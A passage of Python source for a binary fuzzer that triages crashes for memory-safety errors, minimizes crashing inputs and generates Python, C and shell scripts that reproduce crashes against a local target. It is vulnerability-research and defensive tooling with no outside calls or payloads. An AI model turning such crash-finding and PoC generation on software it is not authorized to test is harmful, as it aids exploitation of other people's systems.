            MemoryErrorType.INTEGER_OVERFLOW: "Integer overflow - arithmetic operation overflow",
            MemoryErrorType.FORMAT_STRING: "Format string vulnerability - uncontrolled format string",
        }
        
        desc = desc_map.get(error.error_type, "Unknown memory error")
        
        if error.address:
            desc += f" at address {hex(error.address)}"
        if error.size:
            desc += f" (size: {error.size} bytes)"
        if error.function_name:
            desc += f" in function {error.function_name}"
        
        return desc


class MemorySafetyAnalyzer:
    """
    Advanced memory safety analysis for crash triage.
    
    Capabilities:
    - Heap corruption pattern detection
    - Stack overflow detection via canary analysis
    - Use-after-free detection via shadow memory patterns
    - Integration with sanitizer output parsing
    """
    
    # Common heap metadata patterns
    HEAP_PATTERNS = {
        "glibc_fastbin": b"\x00\x00\x00\x00",  # Simplified
        "windows_heap": bytes([0xAB, 0xAB, 0xAB, 0xAB]),  # Fill pattern
        "freed_memory": bytes([0xDD, 0xDD, 0xDD, 0xDD]),  # Windows debug fill
        "uninitialized": bytes([0xCD, 0xCD, 0xCD, 0xCD]),  # Windows debug fill
    }
    
    # Stack canary patterns
    STACK_CANARIES = {
        "gcc_canary": b"\x00\x00\x00",  # Partial match
        "msvc_gs": bytes([0xCC, 0xCC, 0xCC, 0xCC]),  # /GS cookie
    }
    
    def __init__(self):
        self.sanitizer_parser = SanitizerParser()
        self.analyzed_crashes: Dict[str, List[MemoryError]] = {}
    
    def analyze_crash(
        self,
        execution_result: 'ExecutionResult',
        crash_info: Optional['CrashInfo'] = None,
    ) -> List[MemoryError]:
        """
        Perform comprehensive memory safety analysis on a crash.
        
        Args:
            execution_result: Result from process execution
            crash_info: Optional crash info from basic analysis
            
        Returns:
            List of detected memory errors
        """
        errors = []
        
        # Parse sanitizer output if available
        combined_output = (
            execution_result.stderr.decode('utf-8', errors='replace') +
            execution_result.stdout.decode('utf-8', errors='replace')
        )
        
        sanitizer_errors = self.sanitizer_parser.parse_any(combined_output)
        errors.extend(sanitizer_errors)
        
        # Analyze based on crash type if no sanitizer output
        if not errors and crash_info:
            errors.extend(self._analyze_crash_type(crash_info, execution_result))
        
        # Additional heuristic analysis
        errors.extend(self._heuristic_analysis(execution_result, combined_output))
        
        # Deduplicate errors
        errors = self._deduplicate_errors(errors)
        
        # Store for later reference
        if crash_info:
            self.analyzed_crashes[crash_info.id] = errors
        else:
            self.analyzed_crashes[execution_result.id] = errors
        
        return errors

    def record_errors(self, crash_id: str, errors: List[MemoryError]):
        """Store memory errors for a crash ID."""
        self.analyzed_crashes[crash_id] = errors
    
    def _analyze_crash_type(
        self,
        crash_info: 'CrashInfo',
        execution_result: 'ExecutionResult',
    ) -> List[MemoryError]:
        """Analyze crash based on exception type."""
        errors = []
        
        crash_type_mapping = {
            CrashType.STACK_BUFFER_OVERFLOW: MemoryErrorType.STACK_BUFFER_OVERFLOW,
            CrashType.HEAP_CORRUPTION: MemoryErrorType.HEAP_CORRUPTION,
            CrashType.USE_AFTER_FREE: MemoryErrorType.HEAP_USE_AFTER_FREE,
            CrashType.DOUBLE_FREE: MemoryErrorType.HEAP_DOUBLE_FREE,
            CrashType.NULL_POINTER: MemoryErrorType.NULL_DEREFERENCE,
        }
        
        if crash_info.crash_type in crash_type_mapping:
            error = MemoryError(
                error_type=crash_type_mapping[crash_info.crash_type],
                address=crash_info.exception_address,
                stack_trace=crash_info.stack_trace,
                severity=crash_info.severity,
            )
            error.description = SanitizerParser._generate_description(error)
            errors.append(error)
        
        return errors
    
    def _heuristic_analysis(
        self,
        execution_result: 'ExecutionResult',
        output: str,
    ) -> List[MemoryError]:
        """Apply heuristic analysis for error patterns."""
        errors = []
        
        # Check for common error indicators in output
        heuristics = [
            (r"segmentation fault|SIGSEGV", MemoryErrorType.WILD_POINTER),
            (r"bus error|SIGBUS", MemoryErrorType.WILD_POINTER),
            (r"abort|SIGABRT", MemoryErrorType.HEAP_CORRUPTION),
            (r"stack smashing detected", MemoryErrorType.STACK_BUFFER_OVERFLOW),
            (r"malloc.*corrupt|free.*invalid", MemoryErrorType.HEAP_CORRUPTION),
            (r"double free or corruption", MemoryErrorType.HEAP_DOUBLE_FREE),
            (r"buffer overflow", MemoryErrorType.HEAP_BUFFER_OVERFLOW),
            (r"out of bounds", MemoryErrorType.HEAP_BUFFER_OVERFLOW),
        ]
        
        for pattern, error_type in heuristics:
            if re.search(pattern, output, re.IGNORECASE):
                error = MemoryError(
                    error_type=error_type,
                    severity=SanitizerParser._severity_for_error_type(error_type),
                )
                error.description = SanitizerParser._generate_description(error)
                errors.append(error)
        
        return errors
    
    def _deduplicate_errors(self, errors: List[MemoryError]) -> List[MemoryError]:
        """Remove duplicate errors based on type and location."""
        seen = set()
        unique = []
        
        for error in errors:
            key = (error.error_type, error.address, error.source_file, error.source_line)
            if key not in seen:
                seen.add(key)
                unique.append(error)
        
        return unique
    
    def detect_heap_corruption(self, memory_dump: bytes, address: int) -> Optional[MemoryError]:
        """
        Analyze memory dump for heap corruption patterns.
        
        Args:
            memory_dump: Raw memory around suspected corruption
            address: Address where corruption was detected
            
        Returns:
            MemoryError if corruption detected
        """
        # Look for common corruption patterns
        patterns_found = []
        
        # Check for use-after-free patterns (freed memory fill)
        if self.HEAP_PATTERNS["freed_memory"] in memory_dump:
            patterns_found.append("freed_memory_access")
        
        # Check for uninitialized memory patterns
        if self.HEAP_PATTERNS["uninitialized"] in memory_dump:
            patterns_found.append("uninitialized_memory")
        
        if patterns_found:
            error_type = (
                MemoryErrorType.HEAP_USE_AFTER_FREE 
                if "freed_memory_access" in patterns_found
                else MemoryErrorType.USE_OF_UNINITIALIZED
            )
            
            error = MemoryError(
                error_type=error_type,
                address=address,
                description=f"Heap corruption detected: {', '.join(patterns_found)}",
                severity=SanitizerParser._severity_for_error_type(error_type),
            )
            return error
        
        return None
    
    def detect_stack_overflow(
        self,
        stack_dump: bytes,
        return_address: int,
        stack_base: int,
    ) -> Optional[MemoryError]:
        """
        Detect stack buffer overflow by analyzing stack contents.
        
        Args:
            stack_dump: Raw stack memory
            return_address: Return address from stack
            stack_base: Base address of stack
            
        Returns:
            MemoryError if stack overflow detected
        """
        # Check for overwritten return addresses
        # Heuristic: return address should be in code sections
        suspicious_indicators = []
        
        # Check for NOP sled patterns (common in exploits)
        nop_patterns = [b"\x90" * 8, b"\xcc" * 8]  # x86 NOP, INT3
        for pattern in nop_patterns:
            if pattern in stack_dump:
                suspicious_indicators.append("nop_sled_detected")
        
        # Check for canary corruption (null bytes in canary area)
        # This is simplified - real detection would need canary location
        
        if suspicious_indicators:
            error = MemoryError(
                error_type=MemoryErrorType.STACK_BUFFER_OVERFLOW,
                address=stack_base,
                description=f"Stack overflow indicators: {', '.join(suspicious_indicators)}",
                severity=CrashSeverity.EXPLOITABLE,
            )
            return error
        
        return None
    
    def get_analysis_report(self, crash_id: str) -> Dict[str, Any]:
        """Get comprehensive analysis report for a crash."""
        errors = self.analyzed_crashes.get(crash_id, [])
        
        if not errors:
            return {"crash_id": crash_id, "errors": [], "summary": "No memory errors detected"}
        
        # Categorize errors
        heap_errors = [e for e in errors if "heap" in e.error_type.value]
        stack_errors = [e for e in errors if "stack" in e.error_type.value]
        other_errors = [e for e in errors if e not in heap_errors and e not in stack_errors]
        
        # Determine overall severity
        max_severity = max(errors, key=lambda e: {
            CrashSeverity.EXPLOITABLE: 4,
            CrashSeverity.PROBABLY_EXPLOITABLE: 3,
            CrashSeverity.PROBABLY_NOT_EXPLOITABLE: 2,
            CrashSeverity.NOT_EXPLOITABLE: 1,
            CrashSeverity.UNKNOWN: 0,
        }.get(e.severity, 0)).severity
        
        return {
            "crash_id": crash_id,
            "total_errors": len(errors),
            "heap_errors": len(heap_errors),
            "stack_errors": len(stack_errors),
            "other_errors": len(other_errors),
            "max_severity": max_severity.value,
            "errors": [e.to_dict() for e in errors],
            "exploitability_indicators": self._get_exploitability_indicators(errors),
            "recommendations": self._get_recommendations(errors),
        }
    
    def _get_exploitability_indicators(self, errors: List[MemoryError]) -> List[str]:
        """Get indicators of potential exploitability."""
        indicators = []
        
        for error in errors:
            if error.error_type == MemoryErrorType.HEAP_BUFFER_OVERFLOW:
                indicators.append("Heap overflow may allow heap metadata corruption")
            elif error.error_type == MemoryErrorType.STACK_BUFFER_OVERFLOW:
                indicators.append("Stack overflow may allow return address overwrite")
            elif error.error_type == MemoryErrorType.HEAP_USE_AFTER_FREE:
                indicators.append("UAF may allow arbitrary read/write via type confusion")
            elif error.error_type == MemoryErrorType.FORMAT_STRING:
                indicators.append("Format string may allow arbitrary memory write")
            elif error.error_type == MemoryErrorType.HEAP_DOUBLE_FREE:
                indicators.append("Double-free may allow heap exploitation")
        
        return list(set(indicators))
    
    def _get_recommendations(self, errors: List[MemoryError]) -> List[str]:
        """Get remediation recommendations."""
        recommendations = set()
        
        for error in errors:
            if "heap" in error.error_type.value:
                recommendations.add("Enable heap protection mechanisms (ASLR, heap cookies)")
                recommendations.add("Use safe memory allocators (hardened malloc)")
            if "stack" in error.error_type.value:
                recommendations.add("Enable stack canaries (/GS on MSVC, -fstack-protector on GCC)")
                recommendations.add("Enable Control Flow Guard (CFG) or Shadow Stack")
            if error.error_type == MemoryErrorType.USE_OF_UNINITIALIZED:
                recommendations.add("Initialize all variables before use")
                recommendations.add("Use compiler warnings for uninitialized variables")
            if error.error_type == MemoryErrorType.FORMAT_STRING:
                recommendations.add("Never pass user input directly to format functions")
        
        return list(recommendations)


# =============================================================================
# CRASH MINIMIZATION (Phase 5)
# =============================================================================

@dataclass
class MinimizationResult:
    """Result of crash input minimization."""
    original_size: int
    minimized_size: int
    reduction_percentage: float
    minimized_input: bytes
    minimized_path: str
    iterations: int
    still_crashes: bool
    crash_type: Optional[CrashType] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "original_size": self.original_size,
            "minimized_size": self.minimized_size,
            "reduction_percentage": self.reduction_percentage,
            "minimized_path": self.minimized_path,
            "iterations": self.iterations,
            "still_crashes": self.still_crashes,
            "crash_type": self.crash_type.value if self.crash_type else None,
        }


class CrashMinimizer:
    """
    Minimize crash-inducing inputs using delta debugging.
    
    Implements multiple minimization strategies:
    - Binary search reduction (halving)
    - Linear byte removal
    - Block-based removal
    - Nullification (replace with zeros)
    
    The goal is to find the smallest input that still triggers the crash.
    """
    
    def __init__(
        self,
        harness: ProcessHarness,
        max_iterations: int = 1000,
        target_crash_type: Optional[CrashType] = None,
    ):
        self.harness = harness
        self.max_iterations = max_iterations
        self.target_crash_type = target_crash_type
        self.iterations = 0
        
    async def _test_input(self, data: bytes) -> Tuple[bool, Optional[CrashType]]:
        """Test if input still causes a crash."""
        result = await self.harness.execute(data)
        
        if result.crashed:
            # If we have a target crash type, verify it matches
            if self.target_crash_type:
                return result.crash_type == self.target_crash_type, result.crash_type
            return True, result.crash_type
        
        return False, None
    
    async def minimize(
        self,
        crash_input: bytes,
        output_dir: str,
    ) -> MinimizationResult:
        """
        Minimize a crash input using delta debugging.
        
        Args:
            crash_input: The crash-inducing input
            output_dir: Directory to save minimized input
            
        Returns:
            MinimizationResult with minimized input
        """
        original_size = len(crash_input)
        current = crash_input
        self.iterations = 0
        
        # Verify input actually crashes
        crashes, crash_type = await self._test_input(current)
        if not crashes:
            return MinimizationResult(
                original_size=original_size,
                minimized_size=original_size,
                reduction_percentage=0.0,
                minimized_input=crash_input,
                minimized_path="",
                iterations=0,
                still_crashes=False,
            )
        
        self.target_crash_type = crash_type
        
        # Phase 1: Binary search reduction (fast coarse reduction)
        current = await self._binary_reduction(current)
        
        # Phase 2: Block-based removal
        current = await self._block_removal(current, block_size=64)
        current = await self._block_removal(current, block_size=16)
        current = await self._block_removal(current, block_size=4)
        
        # Phase 3: Linear byte removal
        current = await self._linear_removal(current)
        
        # Phase 4: Nullification (try replacing bytes with zeros)
        current = await self._nullification(current)
        
        # Save minimized input
        minimized_path = os.path.join(output_dir, f"minimized_{hashlib.sha256(current).hexdigest()[:12]}")
        with open(minimized_path, "wb") as f:
            f.write(current)
        
        reduction = ((original_size - len(current)) / original_size) * 100 if original_size > 0 else 0
        
        return MinimizationResult(
            original_size=original_size,
            minimized_size=len(current),
            reduction_percentage=round(reduction, 2),
            minimized_input=current,
            minimized_path=minimized_path,
            iterations=self.iterations,
            still_crashes=True,
            crash_type=crash_type,
        )
    
    async def _binary_reduction(self, data: bytes) -> bytes:
        """Reduce input by repeatedly halving it."""
        current = data
        
        while len(current) > 1 and self.iterations < self.max_iterations:
            self.iterations += 1
            
            # Try first half
            half = len(current) // 2
            first_half = current[:half]
            
            crashes, _ = await self._test_input(first_half)
            if crashes:
                current = first_half
                continue
            
            # Try second half
            second_half = current[half:]
            crashes, _ = await self._test_input(second_half)
            if crashes:
                current = second_half
                continue
            
            # Neither half crashes alone, can't reduce further this way
            break
        
        return current
    
    async def _block_removal(self, data: bytes, block_size: int = 16) -> bytes:
        """Remove blocks of bytes."""
        if len(data) <= block_size:
            return data
        
        current = bytearray(data)
        i = 0
        
        while i < len(current) and self.iterations < self.max_iterations:
            self.iterations += 1
            
            # Try removing a block at position i
            end = min(i + block_size, len(current))
            test = bytes(current[:i] + current[end:])
            
            if len(test) == 0:
                break
            
            crashes, _ = await self._test_input(test)
            if crashes:
                current = bytearray(test)
                # Don't advance i, try removing from same position
            else:
                i += block_size
        
        return bytes(current)
    
    async def _linear_removal(self, data: bytes) -> bytes:
        """Remove bytes one at a time."""
        if len(data) <= 1:
            return data
        
        current = bytearray(data)
        i = 0
        
        while i < len(current) and self.iterations < self.max_iterations:
            self.iterations += 1
            
            # Try removing byte at position i
            test = bytes(current[:i] + current[i+1:])
            
            if len(test) == 0:
                break
            
            crashes, _ = await self._test_input(test)
            if crashes:
                current = bytearray(test)
                # Don't advance i
            else:
                i += 1
        
        return bytes(current)
    
    async def _nullification(self, data: bytes) -> bytes:
        """Try replacing bytes with zeros (sometimes triggers same crash with simpler input)."""
        if len(data) <= 1:
            return data
        
        current = bytearray(data)
        
        for i in range(len(current)):
            if self.iterations >= self.max_iterations:
                break
            
            if current[i] == 0:
                continue
            
            self.iterations += 1
            
            # Try replacing byte with zero
            original = current[i]
            current[i] = 0
            
            crashes, _ = await self._test_input(bytes(current))
            if not crashes:
                # Revert
                current[i] = original
        
        return bytes(current)


# =============================================================================
# POC SCRIPT GENERATOR (Phase 5)
# =============================================================================

class PoCGenerator:
    """
    Generate Proof-of-Concept scripts for reproducing crashes.
    
    Generates:
    - Python script with embedded crash input
    - C program for native reproduction
    - Shell script for quick testing
    - Analysis comments explaining the crash
    """
    
    @staticmethod
    def generate_python_poc(
        crash_info: CrashInfo,
        crash_input: bytes,
        target_path: str,
        target_args: str,
        memory_errors: Optional[List[MemoryError]] = None,
    ) -> str:
        """Generate a Python PoC script."""
        input_b64 = base64.b64encode(crash_input).decode()
        input_hex = crash_input[:100].hex()
        
        memory_analysis = ""
        if memory_errors:
            memory_analysis = "\n# Memory Safety Analysis:\n"
            for err in memory_errors:
                memory_analysis += f"#   - {err.error_type.value}: {err.description}\n"
        
        poc = f'''#!/usr/bin/env python3
"""
Proof-of-Concept: Crash Reproduction Script
Generated by VRAgent Binary Fuzzer

Target: {target_path}
Crash Type: {crash_info.crash_type.value}
Severity: {crash_info.severity.value}
Input Size: {len(crash_input)} bytes
Input Hash: {crash_info.input_hash}
{memory_analysis}
"""

import base64
import subprocess
import tempfile
import os
import sys

# Crash-inducing input (base64 encoded)
CRASH_INPUT_B64 = """{input_b64}"""

# First 100 bytes as hex for reference
# {input_hex}

def get_crash_input() -> bytes:
    """Decode and return the crash input."""
    return base64.b64decode(CRASH_INPUT_B64)

def reproduce_crash(target: str = "{target_path}", args: str = "{target_args}"):
    """
    Reproduce the crash by executing the target with the crash input.
    
    Args:
        target: Path to the vulnerable binary
        args: Command line arguments (@@ is replaced with input file path)
    """
    crash_input = get_crash_input()
    
    # Write input to temp file
    with tempfile.NamedTemporaryFile(delete=False, suffix=".crash_input") as f:
        f.write(crash_input)
        input_path = f.name
    
    try:
        # Build command
        cmd_args = args.replace("@@", input_path)
        cmd = [target] + cmd_args.split()
        
        print(f"[*] Executing: {{' '.join(cmd)}}")
        print(f"[*] Input file: {{input_path}} ({{len(crash_input)}} bytes)")
        
        # Execute
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=30,
        )
        
        print(f"[*] Exit code: {{result.returncode}}")
        
        if result.returncode < 0:
            signal_num = -result.returncode
            print(f"[!] Process terminated by signal {{signal_num}}")
            print("[+] CRASH REPRODUCED!")
        
        if result.stderr:
            print(f"[*] Stderr:\\n{{result.stderr.decode('utf-8', errors='replace')}}")
        
    except subprocess.TimeoutExpired:
        print("[!] Process timed out")
    except FileNotFoundError:
        print(f"[!] Target not found: {{target}}")
    finally:
        os.unlink(input_path)

def save_input(output_path: str = "crash_input.bin"):
    """Save the crash input to a file."""
    crash_input = get_crash_input()
    with open(output_path, "wb") as f:
        f.write(crash_input)
    print(f"[+] Saved crash input to {{output_path}} ({{len(crash_input)}} bytes)")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--save":
        output = sys.argv[2] if len(sys.argv) > 2 else "crash_input.bin"
        save_input(output)
    else:
        reproduce_crash()
'''
        return poc
    
    @staticmethod
    def generate_c_poc(
        crash_info: CrashInfo,
        crash_input: bytes,
        target_path: str,
        target_args: str,
    ) -> str:
        """Generate a C PoC program."""
        # Convert input to C array
        c_array = ", ".join(f"0x{b:02x}" for b in crash_input)
        
        poc = f'''/*
 * Proof-of-Concept: Crash Reproduction Program
 * Generated by VRAgent Binary Fuzzer
 *
 * Target: {target_path}
 * Crash Type: {crash_info.crash_type.value}
 * Severity: {crash_info.severity.value}
 * Input Size: {len(crash_input)} bytes
 *
 * Compile: gcc -o poc poc.c
 * Run: ./poc [target_binary]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

unsigned char crash_input[] = {{
    {c_array}
}};

size_t crash_input_len = {len(crash_input)};

int main(int argc, char *argv[]) {{
    const char *target = argc > 1 ? argv[1] : "{target_path}";
    char input_path[] = "/tmp/crash_input_XXXXXX";
    int fd;
    
    /* Create temp file with crash input */
    fd = mkstemp(input_path);
    if (fd < 0) {{
        perror("mkstemp");
        return 1;
    }}
    
    write(fd, crash_input, crash_input_len);
    close(fd);
    
    printf("[*] Target: %s\\n", target);
    printf("[*] Input: %s (%zu bytes)\\n", input_path, crash_input_len);
    
    /* Fork and execute */
    pid_t pid = fork();
    if (pid == 0) {{
        /* Child - execute target */
        execlp(target, target, input_path, NULL);
        perror("exec");
        exit(1);
    }} else if (pid > 0) {{
        /* Parent - wait and check result */
        int status;
        waitpid(pid, &status, 0);
        
        if (WIFSIGNALED(status)) {{
            printf("[!] Process killed by signal %d\\n", WTERMSIG(status));
            printf("[+] CRASH REPRODUCED!\\n");
        }} else {{
            printf("[*] Exit code: %d\\n", WEXITSTATUS(status));
        }}
    }}
    
    unlink(input_path);
    return 0;
}}
'''
        return poc
    
    @staticmethod
    def generate_shell_poc(
        crash_info: CrashInfo,
        crash_input: bytes,
        target_path: str,
        target_args: str,
    ) -> str:
        """Generate a shell script PoC."""
        input_b64 = base64.b64encode(crash_input).decode()
        
        poc = f'''#!/bin/bash
# Proof-of-Concept: Crash Reproduction Script
# Generated by VRAgent Binary Fuzzer
#
# Target: {target_path}
# Crash Type: {crash_info.crash_type.value}
# Severity: {crash_info.severity.value}
# Input Size: {len(crash_input)} bytes

TARGET="${{1:-{target_path}}}"
INPUT_FILE=$(mktemp)

# Decode crash input
echo "{input_b64}" | base64 -d > "$INPUT_FILE"

echo "[*] Target: $TARGET"
echo "[*] Input: $INPUT_FILE ({len(crash_input)} bytes)"
echo "[*] Executing..."

# Run target
"$TARGET" {target_args.replace('@@', '"$INPUT_FILE"')}
EXIT_CODE=$?

if [ $EXIT_CODE -lt 0 ] || [ $EXIT_CODE -gt 128 ]; then
    echo "[!] Process crashed (exit code: $EXIT_CODE)"
    echo "[+] CRASH REPRODUCED!"
else
    echo "[*] Exit code: $EXIT_CODE"
fi

rm -f "$INPUT_FILE"
'''
        return poc
    
    @staticmethod
    def generate_analysis_report(
        crash_info: CrashInfo,
        crash_input: bytes,
        minimization_result: Optional[MinimizationResult] = None,
        memory_errors: Optional[List[MemoryError]] = None,
    ) -> str:
        """Generate a detailed crash analysis report in Markdown."""
        
        report = f'''# Crash Analysis Report

## Overview

| Property | Value |
|----------|-------|
| **Crash ID** | `{crash_info.id}` |
| **Crash Type** | {crash_info.crash_type.value} |
| **Severity** | {crash_info.severity.value} |
| **Input Hash** | `{crash_info.input_hash}` |
| **Input Size** | {len(crash_input)} bytes |
| **Timestamp** | {crash_info.timestamp} |

## Crash Details

'''
        
        if crash_info.exception_address:
            report += f"- **Exception Address**: `0x{crash_info.exception_address:x}`\n"
        if crash_info.faulting_module:
            report += f"- **Faulting Module**: `{crash_info.faulting_module}`\n"
        if crash_info.notes:
            report += f"- **Notes**: {crash_info.notes}\n"
        
        if crash_info.stack_trace:
            report += "\n### Stack Trace\n\n```\n"
            for frame in crash_info.stack_trace[:20]:
                report += f"{frame}\n"
            report += "```\n"
        
        if memory_errors:
            report += "\n## Memory Safety Analysis\n\n"
            for err in memory_errors:
                report += f"### {err.error_type.value}\n\n"
                report += f"- **Severity**: {err.severity.value}\n"
                report += f"- **Description**: {err.description}\n"
                if err.address:
                    report += f"- **Address**: `0x{err.address:x}`\n"
                if err.source_file:
                    report += f"- **Source**: `{err.source_file}:{err.source_line}`\n"
                if err.function_name:
                    report += f"- **Function**: `{err.function_name}`\n"
                report += "\n"
        
        if minimization_result:
            report += f'''## Input Minimization

| Property | Value |
|----------|-------|
| **Original Size** | {minimization_result.original_size} bytes |
| **Minimized Size** | {minimization_result.minimized_size} bytes |
| **Reduction** | {minimization_result.reduction_percentage}% |
| **Iterations** | {minimization_result.iterations} |
| **Minimized File** | `{minimization_result.minimized_path}` |

'''
        
        # Input preview
        report += "\n## Input Preview\n\n"
        report += "### Hex Dump (first 256 bytes)\n\n```\n"
        for i in range(0, min(256, len(crash_input)), 16):
            hex_part = " ".join(f"{b:02x}" for b in crash_input[i:i+16])
            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in crash_input[i:i+16])
            report += f"{i:08x}  {hex_part:<48}  {ascii_part}\n"
        report += "```\n"
        
        report += "\n## Reproduction\n\n"
        report += "Use the generated PoC scripts to reproduce this crash:\n\n"
        report += "```bash\n"
        report += "python3 poc.py           # Python reproduction\n"
        report += "./poc                    # C reproduction\n"
        report += "bash poc.sh              # Shell reproduction\n"
        report += "```\n"
        
        return report


# =============================================================================
# MAIN BINARY FUZZER
# =============================================================================

@dataclass
class FuzzingSession:
    """State of a binary fuzzing session."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    target_path: str = ""
    target_args: str = "@@"
    mode: FuzzingMode = FuzzingMode.DUMB
    status: str = "idle"  # idle, running, paused, completed, error
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    total_executions: int = 0
    total_crashes: int = 0
    unique_crashes: int = 0
    total_timeouts: int = 0
    executions_per_second: float = 0.0
    coverage_percentage: float = 0.0
    current_input_size: int = 0
    error: Optional[str] = None

    # Execution/coverage configuration
    execution_mode: str = ExecutionMode.PROCESS.value
    execution_warning: Optional[str] = None
    coverage_backend: str = CoverageBackend.NONE.value
    coverage_map_size: int = 65536
    coverage_available: bool = False
    coverage_warning: Optional[str] = None
    comparison_hints_enabled: bool = False
    comparison_hints_generated: int = 0
    comparison_magic_values: int = 0
    
    # Phase 2: Coverage stats
    total_edges_discovered: int = 0
    corpus_size: int = 0
    favored_inputs: int = 0
    new_coverage_inputs: int = 0
    scheduler_strategy: str = "power_schedule"
    
    # Phase 2: Behavior monitoring
    behavior_events: int = 0
    suspicious_behaviors: int = 0
    
    # Phase 3: Memory safety stats
    memory_errors_detected: int = 0
    heap_errors: int = 0
    stack_errors: int = 0
    uaf_errors: int = 0
    exploitable_errors: int = 0
    memory_safety_enabled: bool = False
    sanitizer_target_path: Optional[str] = None
    sanitizer_replay_enabled: bool = False
    sanitizer_warning: Optional[str] = None
    sanitizer_runs: int = 0
    sanitizer_max_runs: int = 0

    # Smart dictionary extraction stats
    smart_dict_entries: int = 0
    smart_dict_strings: int = 0
    smart_dict_constants: int = 0
    smart_dict_magic: int = 0

    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["mode"] = self.mode.value
        return result


class BinaryFuzzer:
    """
    Main binary fuzzing engine with coverage-guided fuzzing support.
    
    Orchestrates:
    - Input mutation
    - Process execution
    - Crash analysis
    - Coverage tracking (Phase 2)
    - Corpus management (Phase 2)
    - Seed scheduling (Phase 2)
    - Behavior monitoring (Phase 2)
    """
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        seed_dir: Optional[str] = None,
        output_dir: Optional[str] = None,
        timeout_ms: int = 5000,
        mode: FuzzingMode = FuzzingMode.DUMB,
        dictionary: Optional[List[bytes]] = None,
        coverage_guided: bool = True,
        scheduler_strategy: str = "power_schedule",
        use_stdin: Optional[bool] = None,
        execution_mode: str = "auto",
        coverage_backend: str = "auto",
        coverage_map_size: int = 65536,
        enable_cmp_hints: bool = True,
        enable_compcov: bool = True,
        cmp_hint_refresh_interval: int = 500,
        persistent_max_execs: int = 10000,
        persistent_shm_size: int = 65536,
        sanitizer_target_path: Optional[str] = None,
        sanitizer_timeout_ms: int = 5000,
        sanitizer_max_runs: int = 10,
    ):
        self.session = FuzzingSession(
            target_path=target_path,
            target_args=target_args,
            mode=mode,
            scheduler_strategy=scheduler_strategy,
        )
        
        # Output directory
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="fuzzer_output_")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Phase 1 Components
        self.mutation_engine = MutationEngine(dictionary)
        try:
            self.execution_mode = ExecutionMode(execution_mode)
        except ValueError:
            self.execution_mode = ExecutionMode.AUTO
        
        try:
            self.coverage_backend = CoverageBackend(coverage_backend)
        except ValueError:
            self.coverage_backend = CoverageBackend.AUTO
        
        self.session.execution_mode = self.execution_mode.value
        self.session.coverage_backend = self.coverage_backend.value
        self.session.coverage_map_size = coverage_map_size
        self.session.comparison_hints_enabled = enable_cmp_hints
        self.enable_cmp_hints = enable_cmp_hints
        self.enable_compcov = enable_compcov
        self.cmp_hint_refresh_interval = max(10, cmp_hint_refresh_interval)
        self.symbolic_hint_generator: Optional[SymbolicExecutionHintGenerator] = None

        self.coverage_provider = None
        if coverage_guided:
            self.coverage_provider = create_coverage_provider(
                self.coverage_backend,
                map_size=coverage_map_size,
            )
            if self.coverage_provider and self.coverage_backend == CoverageBackend.AUTO:
                self.coverage_backend = CoverageBackend.AFL_SHM
            if not self.coverage_provider:
                self.coverage_backend = CoverageBackend.NONE
                logger.info("Coverage backend unavailable. Running without coverage maps.")
                self.session.coverage_backend = self.coverage_backend.value
                self.session.coverage_available = False
                self.session.coverage_warning = "Coverage backend unavailable. Target may be uninstrumented."
            else:
                self.session.coverage_backend = self.coverage_backend.value
        
        harness_env: Dict[str, str] = {}
        if self.enable_compcov:
            harness_env["AFL_COMPCOV_LEVEL"] = "2"
        
        self._process_harness = ProcessHarness(
            target_path=target_path,
            args_template=target_args,
            timeout_ms=timeout_ms,
            use_stdin=use_stdin,
            environment=harness_env,
            coverage_provider=self.coverage_provider,
        )
        self._fallback_harness = self._process_harness
        self.harness = self._process_harness
        
        can_use_forkserver = (
            os.name != "nt"
            and "@@" in target_args
            and not (use_stdin is True)
        )
        
        if self.execution_mode == ExecutionMode.PERSISTENT:
            self.harness = PersistentModeHarness(
                target_path=target_path,
                target_args=target_args,
                timeout_ms=timeout_ms,
                max_executions_per_instance=persistent_max_execs,
                shm_size=persistent_shm_size,
                coverage_provider=self.coverage_provider,
                environment=harness_env,
            )
            self.execution_mode = ExecutionMode.PERSISTENT
        elif self.execution_mode == ExecutionMode.FORKSERVER:
            if can_use_forkserver:
                self.harness = ForkServerHarness(
                    target_path=target_path,
                    target_args=target_args,
                    timeout_ms=timeout_ms,
                    coverage_provider=self.coverage_provider,
                    environment=harness_env,
                )
                self.execution_mode = ExecutionMode.FORKSERVER
            else:
                self.session.execution_warning = "Forkserver requires @@ input and non-stdin execution. Using process mode."
                logger.info("Forkserver mode not compatible with current target args. Using process mode.")
                self.execution_mode = ExecutionMode.PROCESS
        elif self.execution_mode == ExecutionMode.AUTO and can_use_forkserver:
            self.harness = ForkServerHarness(
                target_path=target_path,
                target_args=target_args,
                timeout_ms=timeout_ms,
                coverage_provider=self.coverage_provider,
                environment=harness_env,
            )
            self.execution_mode = ExecutionMode.FORKSERVER
        else:
            self.execution_mode = ExecutionMode.PROCESS
        self.session.execution_mode = self.execution_mode.value

        self.analyzer = CrashAnalyzer(
            target_path=target_path,
            target_args=target_args,
            use_stdin=use_stdin,
        )
        self.crash_db = CrashDatabase(self.output_dir)
        
        # Phase 2 Components: Coverage-guided fuzzing
        self.coverage_guided = coverage_guided
        self.coverage_tracker = CoverageTracker(bitmap_size=coverage_map_size)
        corpus_dir = os.path.join(self.output_dir, "corpus")
        self.corpus_manager = CorpusManager(corpus_dir)
        self.coverage_zero_streak = 0
        self.coverage_zero_threshold = 50
        self.coverage_unavailable_emitted = False
        
        # Set up scheduler with strategy
        try:
            strategy = SeedScheduler.Strategy(scheduler_strategy)
        except ValueError:
            strategy = SeedScheduler.Strategy.POWER_SCHEDULE
        self.scheduler = SeedScheduler(
            self.corpus_manager, 
            self.coverage_tracker, 
            strategy
        )
        
        # Phase 2: Behavior monitoring
        self.behavior_monitor = BehaviorMonitor()
        
        # Phase 3: Memory safety analysis
        self.memory_safety_analyzer = MemorySafetyAnalyzer()
